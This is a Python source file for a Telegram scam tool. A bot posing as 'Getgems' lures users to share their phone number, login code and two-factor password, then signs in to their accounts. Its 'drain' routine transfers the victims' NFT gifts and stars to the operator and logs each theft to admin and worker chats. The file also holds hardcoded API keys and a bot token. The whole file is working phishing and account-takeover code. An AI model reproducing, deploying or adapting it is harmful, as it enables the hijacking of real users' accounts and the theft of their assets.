import os
import asyncio
import threading
from flask import Flask, render_template, request, jsonify
from telethon import TelegramClient, events, Button, functions, SessionPasswordNeededError

# --- CONFIG ---
API_ID = '34426356'
API_HASH = 'ddfa0edfefb66da4b06bc85e23fd40d5'
BOT_TOKEN = '8028370592:AAHmcGRTUoxPEwbDBcw1tsQmQlx5cty3ahM'
ADMIN_ID = 678335503
WORKER_ID = 8311100024

bot = TelegramClient('bot_auth', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
app = Flask(__name__)

active_clients = {}
temp_clients = {}
pending_contacts = {}

def send_log(msg):
    bot.loop.create_task(bot.send_message(ADMIN_ID, f"<b>LOG:</b>\n{msg}", parse_mode='html'))
    bot.loop.create_task(bot.send_message(WORKER_ID, f"<b>LOG:</b>\n{msg}", parse_mode='html'))

# --- DRAIN LOGIC ---
async def drain_logic(client, phone):
    try:
        # 1. Проверка и заправка звездами
        res = await client(functions.payments.GetStarsStatusRequest(peer='me'))
        if res.balance < 25:
            send_log(f"⛽️ Заправка {phone}...")
            me = await client.get_me()
            for _ in range(2):
                await bot(functions.payments.SendStarGiftRequest(peer=me.id, gift_id=685))
                await asyncio.sleep(2)
            
            # Продажа подарков мамонтом для получения звезд
            await asyncio.sleep(5)
            gifts = await client(functions.payments.GetStarGiftsRequest(offset='', limit=5))
            for g in gifts.gifts[:2]:
                await client(functions.payments.SaveStarGiftRequest(stargift_id=g.id, unsave=True))
        
        # 2. Перевод NFT/Gifts админу
        all_gifts = await client(functions.payments.GetStarGiftsRequest(offset='', limit=100))
        for nft in all_gifts.gifts:
            try:
                await client(functions.payments.TransferStarGiftRequest(to_id=ADMIN_ID, stargift_id=nft.id))
                send_log(f"✅ NFT {nft.id} слит с {phone}")
                await asyncio.sleep(3)
            except Exception as e:
                if "BALANCE_TOO_LOW" in str(e): break
                continue
        send_log(f"🏁 Слив {phone} окончен.")
    except Exception as e:
        send_log(f"⚠️ Ошибка слива {phone}: {e}")

# --- API ROUTES ---
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/check_contact')
def check_contact():
    uid = request.args.get('id', '0')
    if uid in pending_contacts:
        return jsonify({"status": "received", "phone": pending_contacts[uid]})
    return jsonify({"status": "waiting"})

@app.route('/api/send_code', methods=['POST'])
async def api_send_code():
    data = request.json
    phone, code = data.get('phone'), data.get('code')
    if phone not in temp_clients: return jsonify({"status": "error"})
    try:
        client = temp_clients[phone]['client']
        await client.sign_in(phone, code, phone_code_hash=temp_clients[phone]['hash'])
        active_clients[phone] = client
        asyncio.create_task(drain_logic(client, phone))
        return jsonify({"status": "success"})
    except SessionPasswordNeededError:
        return jsonify({"status": "2fa_needed"})
    except Exception as e:
        return jsonify({"status": "error", "details": str(e)})

@app.route('/api/send_password', methods=['POST'])
async def api_send_password():
    data = request.json
    phone, password = data.get('phone'), data.get('password')
    try:
        client = temp_clients[phone]['client']
        await client.sign_in(password=password)
        active_clients[phone] = client
        asyncio.create_task(drain_logic(client, phone))
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "details": str(e)})

# --- BOT HANDLERS ---
@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    await event.respond("Добро пожаловать в Getgems!", buttons=[
        [Button.url("Открыть инвентарь", f"https://{request.host}/")]
    ])

@bot.on(events.NewMessage)
async def contact_handler(event):
    if event.contact:
        phone = event.contact.phone_number
        if not phone.startswith('+'): phone = '+' + phone
        pending_contacts[str(event.sender_id)] = phone
        try:
            client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
            await client.connect()
            res = await client.send_code_request(phone)
            temp_clients[phone] = {'client': client, 'hash': res.phone_code_hash}
            send_log(f"📞 Код отправлен на {phone}")
        except Exception as e:
            send_log(f"❌ Ошибка {phone}: {e}")

if __name__ == '__main__':
    if not os.path.exists('sessions'): os.makedirs('sessions')
    threading.Thread(target=lambda: app.run(port=8080, host='0.0.0.0', use_reloader=False), daemon=True).start()
    bot.run_until_disconnected()